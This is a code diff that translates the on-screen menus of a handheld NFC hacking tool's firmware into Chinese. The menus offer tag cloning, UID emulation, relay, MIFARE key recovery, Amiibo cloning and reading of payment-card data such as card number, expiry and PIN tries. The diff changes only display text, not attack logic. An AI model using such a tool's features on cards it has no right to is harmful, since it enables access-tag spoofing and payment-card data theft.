+                                sp.setCursor(4, H-12); sp.print("BACK=停止");
                                 if (us) spr->pushSprite(0, 0);
                             }
                             M5.update(); cardUpdate();
@@ -49977,9 +50274,9 @@ void nfc_amiibo_ui() {
                     } else {
                         // ---- CLONE (untested HW) ----
                         sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Amiibo CLONE");
-                        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(8, 44); sp.print("Place NTAG215 (magic)...");
-                        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=cancel");
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Amiibo 克隆");
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(8, 44); sp.print("请放置 NTAG215 魔术卡...");
+                        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=取消");
                         if (us) spr->pushSprite(0, 0);
                         NfcCardInfo c = {}; bool cancel = false;
                         while (!c.valid) {
@@ -49991,13 +50288,13 @@ void nfc_amiibo_ui() {
                             int fail = 0;
                             int ok = amiibo_clone_write(&g_amiibo, /*set_uid=*/true, &fail);
                             sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Amiibo CLONE");
-                            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 24); sp.printf("Pages OK  : %d", ok);
-                            sp.setTextColor(fail ? TFT_RED : TFT_WHITE, TFT_BLACK); sp.setCursor(4, 40); sp.printf("Pages fail: %d", fail);
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Amiibo 克隆");
+                            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 24); sp.printf("成功页数: %d", ok);
+                            sp.setTextColor(fail ? TFT_RED : TFT_WHITE, TFT_BLACK); sp.setCursor(4, 40); sp.printf("失败页数: %d", fail);
                             sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(4, 62);
-                            sp.print(fail ? "UID not writable? ->" : "Written. Verify w/ PM3");
-                            sp.setCursor(4, 76); if (fail) sp.print("valid amiibo needs magic");
-                            sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("any key");
+                            sp.print(fail ? "UID不可写? ->" : "写入完成,可用PM3验证");
+                            sp.setCursor(4, 76); if (fail) sp.print("有效Amiibo需魔术卡");
+                            sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("按任意键返回");
                             if (us) spr->pushSprite(0, 0);
                             while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); break; } delay(10); }
                         }
@@ -50016,18 +50313,18 @@ void nfcMenu() {
 
     // Open NFC
     M5.Display.clear(TFT_BLACK);
-    M5.Display.setTextSize(1); M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1); evilKeepCnFont(M5.Display);
     M5.Display.setTextColor(TFT_ORANGE, TFT_BLACK);
-    M5.Display.setCursor(10, 50); M5.Display.print("Opening Cap NFC...");
+    M5.Display.setCursor(10, 50); M5.Display.print("正在打开 Cap NFC...");
     M5.Display.display();
     if (!nfc_open()) {
         // No Cap NFC HAT: the only HAT-less relay role is Virtual Card A (ESP-NOW test shim for jalon 3).
         M5Canvas vcs(&M5.Display); vcs.setColorDepth(8); bool vc_ok = vcs.createSprite(240, 135);
         auto& d = vc_ok ? (LovyanGFX&)vcs : (LovyanGFX&)M5.Display;   // double-buffer -> no flicker
-        d.fillScreen(TFT_BLACK); d.setTextSize(1); d.setTextFont(1);
-        d.setCursor(6, 20); d.setTextColor(TFT_ORANGE, TFT_BLACK); d.print("No Cap NFC HAT");
-        d.setCursor(6, 40); d.setTextColor(TFT_WHITE, TFT_BLACK); d.print("VirtCard A (ESP-NOW)");
-        d.setCursor(6, 64); d.setTextColor(TFT_GREEN, TFT_BLACK); d.print("ENT=start  BACK=exit");
+        d.fillScreen(TFT_BLACK); evilSetCnFont(d, 1); evilKeepCnFont(d);
+        d.setCursor(6, 20); d.setTextColor(TFT_ORANGE, TFT_BLACK); d.print("未检测到 Cap NFC 模块");
+        d.setCursor(6, 40); d.setTextColor(TFT_WHITE, TFT_BLACK); d.print("虚拟卡 A (ESP-NOW)");
+        d.setCursor(6, 64); d.setTextColor(TFT_GREEN, TFT_BLACK); d.print("ENT=启动  BACK=退出");
         if (vc_ok) vcs.pushSprite(0, 0);
         bool go = false;
         while (true) { M5.update(); cardUpdate(); if (kp(KEY_ENTER)) { keyRelease(); go = true; break; } if (kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(10); }
@@ -50050,13 +50347,13 @@ void nfcMenu() {
                 if (served != drawn || vprof != drawn_prof) {   // redraw on change
                     drawn = served; drawn_prof = vprof;
                     d.fillScreen(TFT_BLACK);
-                    d.setCursor(6, 6);  d.setTextColor(TFT_ORANGE, TFT_BLACK); d.print("VirtCard A (noHAT)");
-                    d.setCursor(6, 24); d.setTextColor(TFT_YELLOW, TFT_BLACK); d.printf("Profile: %s", vcard_name(vprof));
-                    d.setCursor(6, 42); d.setTextColor(TFT_GREEN, TFT_BLACK);  d.print(".=next profile");
-                    d.setCursor(6, 60); d.setTextColor(TFT_WHITE, TFT_BLACK);  d.printf("APDUs served: %d", served);
-                    d.setCursor(6, 78); d.setTextColor(TFT_CYAN, TFT_BLACK);   d.print("Last REQ:");
-                    d.setCursor(6, 92); d.print(lastreq[0] ? lastreq : "(waiting B)");
-                    d.setCursor(6, 118); d.setTextColor(0x5AEB, TFT_BLACK);    d.print("BACK=stop");
+                    d.setCursor(6, 6);  d.setTextColor(TFT_ORANGE, TFT_BLACK); d.print("虚拟卡 A (无模块)");
+                    d.setCursor(6, 24); d.setTextColor(TFT_YELLOW, TFT_BLACK); d.printf("配置: %s", vcard_name(vprof));
+                    d.setCursor(6, 42); d.setTextColor(TFT_GREEN, TFT_BLACK);  d.print(".=切换配置");
+                    d.setCursor(6, 60); d.setTextColor(TFT_WHITE, TFT_BLACK);  d.printf("已响应 APDU: %d", served);
+                    d.setCursor(6, 78); d.setTextColor(TFT_CYAN, TFT_BLACK);   d.print("最近请求:");
+                    d.setCursor(6, 92); d.print(lastreq[0] ? lastreq : "(等待 B 端)");
+                    d.setCursor(6, 118); d.setTextColor(0x5AEB, TFT_BLACK);    d.print("BACK=停止");
                     if (vc_ok) vcs.pushSprite(0, 0);
                 }
                 M5.update(); cardUpdate();
@@ -50074,7 +50371,7 @@ void nfcMenu() {
     if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(W, H); }
     auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
 
-    const char* items[] = {"Read Tag", "Saved Tags", "EMV Reader", "Write NDEF", "Write Clone", "Write UID", "Relay/Emul", "Ultralight/NTAG", "ISO-V/F/B Scan", "DESFire", "mfkey (MIFARE)", "Amiibo"};
+    const char* items[] = {"读取标签", "已存标签", "EMV 银行卡读取", "写入 NDEF", "克隆写入", "写入 UID", "中继/模拟", "Ultralight/NTAG", "ISO-V/F/B 扫描", "DESFire 分析", "mfkey (MIFARE)", "Amiibo 模拟/克隆"};
     const int nfc_item_count = 12;
     const int nfc_lineH = 16;
     const int nfc_listY = 18;
@@ -50091,10 +50388,10 @@ void nfcMenu() {
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 16, 0x0841);
                 sp.drawFastHLine(0, 16, W, 0xFC00);
-                sp.setTextFont(1);
-                sp.setTextSize(1.5);
+                evilKeepCnFont(sp);
+                evilSetCnFont(sp, 1.5);
                 sp.setTextColor(0xFC00, 0x0841); sp.setCursor(80, 2); sp.print("Cap NFC");
-                sp.setTextSize(1.5);
+                evilSetCnFont(sp, 1.5);
                 for (int i = 0; i < nfc_maxVis && (nfc_start + i) < nfc_item_count; i++) {
                     int idx = nfc_start + i;
                     int y = nfc_listY + i * nfc_lineH;
@@ -50107,9 +50404,9 @@ void nfcMenu() {
                     sp.setCursor(10, y + 2); sp.print(items[idx]);
                 }
                 sp.fillRect(0, H - 14, W, 14, 0x0841);
-                sp.setTextSize(1);
+                evilSetCnFont(sp, 1);
                 sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
-                sp.print(";/. ENT BACK");
+                sp.print(";/.选择 ENT=确认 BACK=返回");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 nfc_need_draw = false;
             }
@@ -50129,11 +50426,11 @@ void nfcMenu() {
                 // Scanning screen
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 14, 0x0841);
-                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Cap NFC Read");
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Cap NFC 读取");
                 sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                sp.setCursor(30, 55); sp.print("Place tag on reader...");
+                sp.setCursor(30, 55); sp.print("请将标签放在读卡器上...");
                 sp.fillRect(0, H-14, W, 14, 0x0841);
-                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=菜单");
                 if (use_sprite) sprite->pushSprite(0, 0);
 
                 // Poll for card with key check
@@ -50188,25 +50485,25 @@ void nfcMenu() {
                     read_analysis_redraw:;
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Tag Found!");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("发现标签!");
 
                     sp.setTextColor(TFT_GREEN, TFT_BLACK);
                     sp.setCursor(10, 20); sp.print("UID: ");
                     for (int i = 0; i < card.uid_len; i++) sp.printf("%02X ", card.uid[i]);
 
                     sp.setCursor(10, 34); sp.printf("ATQA: %04X  SAK: %02X", card.atqa, card.sak);
-                    sp.setCursor(10, 48); sp.printf("Type: %s", card_type);
+                    sp.setCursor(10, 48); sp.printf("类型: %s", card_type);
 
                     if (is_classic && mf_blocks) {
                         int num_sectors = mf_total_blocks / 4;
                         sp.setTextColor(mf_sectors_read > 0 ? TFT_GREEN : TFT_RED, TFT_BLACK);
-                        sp.setCursor(10, 62); sp.printf("Sectors: %d/%d read", mf_sectors_read, num_sectors);
+                        sp.setCursor(10, 62); sp.printf("扇区: 已读 %d/%d", mf_sectors_read, num_sectors);
                     }
 
                     // Show NDEF content for Ultralight/NTAG
                     if (ndef_type > 0) {
                         sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                        sp.setCursor(10, 62); sp.print(ndef_type == 1 ? "URL:" : "Text:");
+                        sp.setCursor(10, 62); sp.print(ndef_type == 1 ? "链接:" : "文本:");
                         sp.setTextColor(TFT_GREEN, TFT_BLACK);
                         // Word-wrap NDEF content on 2 lines
                         String nc(ndef_content);
@@ -50220,12 +50517,12 @@ void nfcMenu() {
 
                     sp.setTextColor(TFT_CYAN, TFT_BLACK);
                     int y_opt = (is_classic || ndef_type > 0) ? 98 : 70;
-                    sp.setCursor(10, y_opt); sp.print("ENTER=Save  F=.nfc(Flipper)");
-                    sp.setCursor(10, y_opt + 12); sp.print("E = Emulate  BACK = Rescan");
+                    sp.setCursor(10, y_opt); sp.print("ENT=保存  F=导出.nfc");
+                    sp.setCursor(10, y_opt + 12); sp.print("E=模拟    BACK=重扫");
 
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.printf("UID len: %d bytes", card.uid_len);
+                    sp.printf("UID长度: %d 字节", card.uid_len);
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     while (true) {
@@ -50270,11 +50567,11 @@ void nfcMenu() {
                             sp.fillScreen(TFT_BLACK);
                             sp.setTextColor(ok ? TFT_GREEN : TFT_RED, TFT_BLACK);
                             sp.setCursor(10, 50);
-                            sp.print(ok ? "Saved!" : "SD save failed");
+                            sp.print(ok ? "已保存!" : "SD卡保存失败");
                             if (ok) {
                                 sp.setCursor(10, 65); sp.print(fname);
                                 if (mf_blocks) {
-                                    sp.setCursor(10, 80); sp.printf("%d sectors, %d blocks", mf_sectors_read, mf_total_blocks);
+                                    sp.setCursor(10, 80); sp.printf("%d 扇区, %d 块", mf_sectors_read, mf_total_blocks);
                                 }
                             }
                             if (use_sprite) sprite->pushSprite(0, 0);
@@ -50288,15 +50585,15 @@ void nfcMenu() {
                             // Emulate this card's UID via ST25R3916 target mode
                             sp.fillScreen(TFT_BLACK);
                             sp.fillRect(0, 0, W, 14, 0x0841);
-                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emulating UID");
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("正在模拟 UID");
                             sp.setTextColor(TFT_GREEN, TFT_BLACK);
                             sp.setCursor(10, 30); sp.print("UID: ");
                             for (int i = 0; i < card.uid_len; i++) sp.printf("%02X ", card.uid[i]);
                             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                            sp.setCursor(10, 55); sp.print("Target mode active...");
+                            sp.setCursor(10, 55); sp.print("被动目标模式已激活...");
                             sp.setCursor(10, 70); sp.printf("ATQA:%04X SAK:%02X", card.atqa, card.sak);
                             sp.fillRect(0, H-14, W, 14, 0x0841);
-                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=停止");
                             if (use_sprite) sprite->pushSprite(0, 0);
                             nfc_emulate_uid(card.uid, card.uid_len, card.atqa, card.sak, 120);
                             nfc_close(); nfc_open();
@@ -50314,7 +50611,7 @@ void nfcMenu() {
                                                          nfc_path, sizeof(nfc_path));
                             sp.fillScreen(TFT_BLACK);
                             sp.setTextColor(ok ? TFT_GREEN : TFT_RED, TFT_BLACK);
-                            sp.setCursor(10, 45); sp.print(ok ? "Saved .nfc (Flipper)" : ".nfc export failed");
+                            sp.setCursor(10, 45); sp.print(ok ? "已保存 .nfc (Flipper)" : ".nfc 导出失败");
                             if (ok) { sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(10, 62); sp.print(nfc_path); }
                             if (use_sprite) sprite->pushSprite(0, 0);
                             delay(1500);
@@ -50344,7 +50641,7 @@ void nfcMenu() {
             if (file_count == 0) {
                 sp.fillScreen(TFT_BLACK);
                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 55); sp.print("No saved tags in /evil/nfc/");
+                sp.setCursor(10, 55); sp.print("/evil/nfc/ 中无已存标签");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2000);
             } else {
@@ -50354,7 +50651,7 @@ void nfcMenu() {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
                     sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-                    sp.printf("Saved (%d tags)", file_count);
+                    sp.printf("已存标签 (%d)", file_count);
                     for (int i = 0; i < visible; i++) {
                         int idx = scroll + i;
                         bool s = (idx == sel);
@@ -50366,7 +50663,7 @@ void nfcMenu() {
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.print("TAB=dn ENT=view DEL=rm BACK=menu");
+                    sp.print("TAB=下 ENT=查看 DEL=删 BACK=返回");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     while (true) {
@@ -50390,11 +50687,11 @@ void nfcMenu() {
                             String fn_del = files[sel].substring(files[sel].lastIndexOf('/') + 1);
                             sp.fillScreen(TFT_BLACK);
                             sp.setTextColor(TFT_RED, TFT_BLACK);
-                            sp.setCursor(10, 40); sp.print("Delete this file?");
+                            sp.setCursor(10, 40); sp.print("确认删除此文件?");
                             sp.setTextColor(TFT_WHITE, TFT_BLACK);
                             sp.setCursor(10, 60); sp.print(fn_del);
                             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                            sp.setCursor(10, 90); sp.print("ENTER=Yes  BACK=No");
+                            sp.setCursor(10, 90); sp.print("ENTER=确认  BACK=取消");
                             if (use_sprite) sprite->pushSprite(0, 0);
                             bool confirmed = false;
                             while (true) {
@@ -50451,11 +50748,11 @@ void nfcMenu() {
                                         sp.fillRect(0, H-14, W, 14, 0x0841);
                                         sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
                                         if (info_count > info_visible)
-                                            sp.printf(".,=pg E=Emu %s BACK", block_count > 0 ? "D=Data" : "");
+                                            sp.printf(".,=翻页 E=模拟 %s BACK=返回", block_count > 0 ? "D=数据" : "");
                                         else if (block_count > 0)
-                                            sp.printf("E=Emu D=Data(%d) BACK=list", block_count);
+                                            sp.printf("E=模拟 D=数据(%d) BACK=返回", block_count);
                                         else
-                                            sp.print("E=Emulate  BACK=list");
+                                            sp.print("E=模拟  BACK=返回列表");
                                     } else {
                                         sp.setTextColor(TFT_CYAN, TFT_BLACK);
                                         int visible = min(8, block_count - blk_scroll);
@@ -50465,7 +50762,7 @@ void nfcMenu() {
                                         }
                                         sp.fillRect(0, H-14, W, 14, 0x0841);
                                         sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                                        sp.printf(".,/=scroll %d/%d BACK=info", blk_scroll/8+1, (block_count+7)/8);
+                                        sp.printf(".,/=翻页 %d/%d BACK=信息", blk_scroll/8+1, (block_count+7)/8);
                                     }
                                     if (use_sprite) sprite->pushSprite(0, 0);
 
@@ -50535,14 +50832,14 @@ void nfcMenu() {
                                         if (emu_len > 0) {
                                             sp.fillScreen(TFT_BLACK);
                                             sp.fillRect(0, 0, W, 14, 0x0841);
-                                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emulating UID");
+                                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("正在模拟 UID");
                                             sp.setTextColor(TFT_GREEN, TFT_BLACK);
                                             sp.setCursor(10, 30); sp.print("UID: ");
                                             for (int i = 0; i < emu_len; i++) sp.printf("%02X ", emu_uid[i]);
                                             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                                            sp.setCursor(10, 55); sp.print("Target mode active...");
+                                            sp.setCursor(10, 55); sp.print("被动目标模式已激活...");
                                             sp.fillRect(0, H-14, W, 14, 0x0841);
-                                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=停止");
                                             if (use_sprite) sprite->pushSprite(0, 0);
                                             uint16_t emu_atqa = 0x0004; uint8_t emu_sak = 0x08;
                                             nfc_emulate_uid(emu_uid, emu_len, emu_atqa, emu_sak, 120);
@@ -50565,11 +50862,11 @@ void nfcMenu() {
         if (mode == 3) {
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 14, 0x0841);
-            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("EMV Reader");
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("EMV 银行卡读取");
             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-            sp.setCursor(30, 55); sp.print("Tap payment card...");
+            sp.setCursor(30, 55); sp.print("请贴近银行卡...");
             sp.fillRect(0, H-14, W, 14, 0x0841);
-            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=菜单");
             if (use_sprite) sprite->pushSprite(0, 0);
 
             while (true) {
@@ -50599,7 +50896,7 @@ void nfcMenu() {
                     // Now safe to update display
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Reading EMV...");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("正在读取 EMV...");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     EmvCard emv = {};
@@ -50612,7 +50909,7 @@ void nfcMenu() {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
                     sp.drawFastHLine(0, 14, W, 0xFC00);
-                    sp.setTextSize(1); sp.setTextFont(1);
+                    evilSetCnFont(sp, 1); evilKeepCnFont(sp);
 
                     if (emv.valid) {
                         // 1. App name (orange header)
@@ -50629,8 +50926,8 @@ void nfcMenu() {
                         if (emv.expiry[0]) {
                             sp.setTextColor(0xBDF7, TFT_BLACK); // light gray
                             sp.setCursor(4, y);
-                            sp.printf("Exp: %s", emv.expiry);
-                            if (emv.effective[0]) sp.printf("  Active: %s", emv.effective);
+                            sp.printf("有效期: %s", emv.expiry);
+                            if (emv.effective[0]) sp.printf("  生效: %s", emv.effective);
                             y += 11;
                         }
 
@@ -50666,36 +50963,36 @@ void nfcMenu() {
                         sp.setTextColor(0x7BEF, TFT_BLACK);
                         if (emv.atc || emv.pin_tries) {
                             sp.setCursor(4, y);
-                            if (emv.atc) sp.printf("Tx:%d", emv.atc);
-                            if (emv.pin_tries) sp.printf("  PIN:%d left", emv.pin_tries);
-                            if (emv.language[0]) sp.printf("  Lang:%s", emv.language);
+                            if (emv.atc) sp.printf("交易:%d", emv.atc);
+                            if (emv.pin_tries) sp.printf("  PIN剩余:%d", emv.pin_tries);
+                            if (emv.language[0]) sp.printf("  语言:%s", emv.language);
                             y += 11;
                         }
 
                         // 10. CVM / Auth methods (orange)
                         if (emv.auth_method[0]) {
                             sp.setTextColor(0xFC00, TFT_BLACK);
-                            sp.setCursor(4, y); sp.printf("Auth:%s", emv.auth_method);
+                            sp.setCursor(4, y); sp.printf("认证:%s", emv.auth_method);
                             y += 11;
                         }
 
                         // 11. Usage (green)
                         if (emv.usage[0]) {
                             sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
-                            sp.setCursor(4, y); sp.printf("Use:%s", emv.usage);
+                            sp.setCursor(4, y); sp.printf("用途:%s", emv.usage);
                             y += 11;
                         }
                     } else {
                         sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-                        sp.print("EMV Read");
+                        sp.print("EMV 读取");
                         sp.setTextColor(TFT_YELLOW, TFT_BLACK);
                         if (!rats_resp || rx_len == 0) {
-                            sp.setCursor(10, 25); sp.print("RATS failed (no ATS)");
+                            sp.setCursor(10, 25); sp.print("RATS 失败 (无 ATS)");
                         } else if (emv.card_type[0]) {
-                            sp.setCursor(10, 25); sp.printf("Type: %s", emv.card_type);
-                            sp.setCursor(10, 40); sp.print("PAN not found in records");
+                            sp.setCursor(10, 25); sp.printf("类型: %s", emv.card_type);
+                            sp.setCursor(10, 40); sp.print("记录中未找到卡号(PAN)");
                         } else {
-                            sp.setCursor(10, 25); sp.print("Could not read EMV data");
+                            sp.setCursor(10, 25); sp.print("无法读取 EMV 数据");
                         }
                         sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
                         sp.setCursor(10, 60); sp.print("UID: ");
@@ -50705,7 +51002,7 @@ void nfcMenu() {
 
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.print(emv.valid ? "ENTER=Save BACK=menu" : "BACK=menu");
+                    sp.print(emv.valid ? "ENTER=保存 BACK=菜单" : "BACK=菜单");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     while (true) {
@@ -50740,7 +51037,7 @@ void nfcMenu() {
                                 ef.close();
                                 sp.fillRect(0, 95, W, 20, TFT_BLACK);
                                 sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                                sp.setCursor(4, 98); sp.printf("Saved: %s", emv_fname + 10);
+                                sp.setCursor(4, 98); sp.printf("已保存: %s", emv_fname + 10);
                                 if (use_sprite) sprite->pushSprite(0, 0);
                                 delay(1500);
                             }
@@ -50769,8 +51066,8 @@ void nfcMenu() {
             if (file_count == 0) {
                 sp.fillScreen(TFT_BLACK);
                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 50); sp.print("No saved tags to emulate");
-                sp.setCursor(10, 65); sp.print("Read a tag first (mode 1)");
+                sp.setCursor(10, 50); sp.print("无已存标签可模拟");
+                sp.setCursor(10, 65); sp.print("请先读取标签 (模式 1)");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2000);
             } else {
@@ -50778,7 +51075,7 @@ void nfcMenu() {
                 while (true) {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emulate - Select Tag");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("模拟 - 选择标签");
                     for (int i = 0; i < min(file_count, 7); i++) {
                         bool s = (i == sel);
                         sp.setTextColor(s ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
@@ -50788,7 +51085,7 @@ void nfcMenu() {
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.print("TAB=dn ENTER=emulate BACK=menu");
+                    sp.print("TAB=下 ENTER=模拟 BACK=菜单");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     while (true) {
@@ -50828,14 +51125,14 @@ void nfcMenu() {
                             if (emu_len > 0) {
                                 sp.fillScreen(TFT_BLACK);
                                 sp.fillRect(0, 0, W, 14, 0x0841);
-                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emulating UID");
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("正在模拟 UID");
                                 sp.setTextColor(TFT_GREEN, TFT_BLACK);
                                 sp.setCursor(10, 30); sp.print("UID: ");
                                 for (int i = 0; i < emu_len; i++) sp.printf("%02X ", emu_uid[i]);
                                 sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                                sp.setCursor(10, 55); sp.print("Target mode active...");
+                                sp.setCursor(10, 55); sp.print("被动目标模式已激活...");
                                 sp.fillRect(0, H-14, W, 14, 0x0841);
-                                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=停止");
                                 if (use_sprite) sprite->pushSprite(0, 0);
                                 uint16_t ea = 0x0004; uint8_t es = 0x08;
                                 nfc_emulate_uid(emu_uid, emu_len, ea, es, 120);
@@ -50843,7 +51140,7 @@ void nfcMenu() {
                             } else {
                                 sp.fillScreen(TFT_BLACK);
                                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                                sp.setCursor(10, 55); sp.print("No UID found in file");
+                                sp.setCursor(10, 55); sp.print("文件中未找到 UID");
                                 if (use_sprite) sprite->pushSprite(0, 0);
                                 delay(1500);
                             }
@@ -50861,12 +51158,12 @@ void nfcMenu() {
             // Sub-menu: URL or Text
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 14, 0x0841);
-            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write NDEF");
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("写入 NDEF");
             sp.setTextColor(TFT_CYAN, TFT_BLACK);
-            sp.setCursor(10, 24); sp.print("1. URL");
-            sp.setCursor(10, 40); sp.print("2. Text");
+            sp.setCursor(10, 24); sp.print("1. 网址 (URL)");
+            sp.setCursor(10, 40); sp.print("2. 文本 (Text)");
             sp.fillRect(0, H-14, W, 14, 0x0841);
-            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("1-2=select BACK=menu");
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("1-2=选择 BACK=菜单");
             if (use_sprite) sprite->pushSprite(0, 0);
 
             int ndef_type = 0;
@@ -50882,7 +51179,7 @@ void nfcMenu() {
             // Text input via keyboard
             char input_buf[128] = {};
             int input_pos = 0;
-            const char* prompt = (ndef_type == 1) ? "Enter URL:" : "Enter text:";
+            const char* prompt = (ndef_type == 1) ? "输入网址 (URL):" : "输入文本:";
             if (ndef_type == 1) { strcpy(input_buf, "https://"); input_pos = 8; }
 
             while (true) {
@@ -50898,7 +51195,7 @@ void nfcMenu() {
                 sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.print("_");
                 sp.fillRect(0, H-14, W, 14, 0x0841);
                 sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                sp.printf("ENTER=write  len:%d", input_pos);
+                sp.printf("ENTER=写入  长度:%d", input_pos);
                 if (use_sprite) sprite->pushSprite(0, 0);
 
                 M5.update(); cardUpdate();
@@ -50926,7 +51223,7 @@ void nfcMenu() {
             if (rec_len == 0) {
                 sp.fillScreen(TFT_BLACK);
                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 50); sp.print("Encode failed");
+                sp.setCursor(10, 50); sp.print("编码失败");
